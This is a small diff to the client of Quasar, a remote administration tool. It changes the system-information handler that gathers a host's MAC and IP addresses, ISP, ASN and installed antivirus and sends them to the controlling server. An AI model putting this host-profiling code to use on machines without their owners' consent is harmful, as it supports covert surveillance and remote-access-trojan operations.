@@ -8,6 +8,7 @@ using System.Collections.Generic;
 using System.IO;
 using System.Net.NetworkInformation;
 using Quasar.Client.IO;
+using System.Diagnostics;
 
 namespace Quasar.Client.Messages
 {
@@ -53,7 +54,8 @@ namespace Quasar.Client.Messages
                     new Tuple<string, string>("Uptime", SystemHelper.GetUptime()),
                     new Tuple<string, string>("MAC Address", HardwareDevices.MacAddress),
                     new Tuple<string, string>("LAN IP Address", HardwareDevices.LanIpAddress),
-                    new Tuple<string, string>("WAN IP Address", geoInfo.IpAddress),
+                    new Tuple<string, string>("WAN IPv4 Address", geoInfo.IPv4Address),
+                    new Tuple<string, string>("WAN IPv6 Address", geoInfo.IPv6Address),
                     new Tuple<string, string>("ASN", geoInfo.Asn),
                     new Tuple<string, string>("ISP", geoInfo.Isp),
                     new Tuple<string, string>("Antivirus", SystemHelper.GetAntivirus()),
@@ -64,8 +66,9 @@ namespace Quasar.Client.Messages
 
                 client.Send(new GetSystemInfoResponse { SystemInfos = lstInfos });
             }
-            catch
+            catch (Exception)
             {
+                //cant get
             }
         }
     }
